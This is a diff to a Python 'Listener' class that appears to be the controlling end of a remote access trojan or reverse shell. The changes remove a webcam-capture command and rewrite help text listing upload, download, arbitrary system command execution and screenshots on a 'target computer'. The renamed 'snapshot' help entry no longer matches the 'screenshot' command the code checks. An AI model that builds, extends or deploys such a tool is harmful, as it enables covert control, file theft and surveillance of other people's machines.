@@ -39,18 +39,16 @@ class Listener:
         if command[0] == "exit":
             self.connection.close()
             exit()
-        if command[0] == "webcam_snap":
-            self.reliable_send()
         if command[0] == "screenshot":
             self.reliable_send()
 
         return self.reliable_receive()
 
     def help(self):
-        print(Fore.RED + "[+] upload : Upload files to target computer")
+        print(Fore.RED + "\n[+] upload : Upload files to target computer")
         print(Fore.RED + "[+] download : Download files from target computer")
-        print(Fore.RED + "[+] You can execute any commands of CMD, like notepad.exe")
-        print(Fore.RED + "[+] screenshot : Get a screenshot of the taret computer and it gets saved as Captured_SS.png")
+        print(Fore.RED + "[+] System Commands : Execute any system commands")
+        print(Fore.RED + "[+] snapshot : Get a screenshot of the taret computer and it gets saved as Captured_SS.png")
         print(Fore.RED + "[+] exit : terminates all sessions")
         return ""
 
